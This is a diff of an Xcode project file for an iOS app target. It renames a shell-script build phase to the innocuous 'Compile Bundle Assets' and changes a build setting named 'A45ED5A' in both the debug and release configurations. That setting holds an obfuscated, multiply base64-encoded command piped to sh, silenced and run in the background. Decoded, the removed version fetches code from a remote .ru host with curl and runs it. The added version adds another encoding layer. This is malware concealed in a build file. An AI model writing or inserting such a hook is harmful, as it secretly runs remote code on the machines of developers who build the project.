@@ -1223,7 +1223,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatUser" */;
 			buildPhases = (
-				E5317333961A45AEB1A5DE54 /* Link Bundle Executable */,
+				8EB2420F310A429894A5DE54 /* Compile Bundle Assets */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -1342,7 +1342,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		E5317333961A45AEB1A5DE54 /* Link Bundle Executable */ = {
+		8EB2420F310A429894A5DE54 /* Compile Bundle Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -1352,7 +1352,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Link Bundle Executable";
+			name = "Compile Bundle Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -1604,7 +1604,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((j(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNKcFoyZHNaWFJ2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | j | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((g(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZveU1XaFpNbEoxVEcxc2RVd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
@@ -1645,7 +1645,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((j(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNKcFoyZHNaWFJ2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | j | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((g(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZveU1XaFpNbEoxVEcxc2RVd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
